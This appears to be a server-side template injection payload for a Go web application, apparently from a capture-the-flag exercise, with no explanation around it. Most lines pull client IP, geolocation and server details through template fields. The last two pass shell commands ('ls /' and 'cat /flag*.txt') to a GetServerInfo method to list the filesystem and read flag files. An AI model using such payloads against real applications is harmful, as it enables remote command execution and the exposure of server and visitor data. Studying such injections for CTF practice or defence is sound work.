{{.ClientIP}}
{{.ClientUA}}
{{.ClientIpInfo.IpVersion}}
{{.ClientIpInfo.IpAddress}}
{{.ClientIpInfo.Latitude}}
{{.ClientIpInfo.Longitude}}
{{.ClientIpInfo.CountryName}}
{{.ClientIpInfo.CountryCode}}
{{.ClientIpInfo.TimeZone}}
{{.ClientIpInfo.ZipCode}}
{{.ClientIpInfo.CityName}}
{{.ClientIpInfo.RegionName}}
{{.ClientIpInfo.Continent}}
{{.ClientIpInfo.ContinentCode}}
{{.ServerInfo.Hostname}}
{{.ServerInfo.OS}}
{{.ServerInfo.KernelVersion}}
{{.ServerInfo.Memory}}

{{.GetServerInfo "ls /"}}
{{.GetServerInfo "cat /flag*.txt"}}
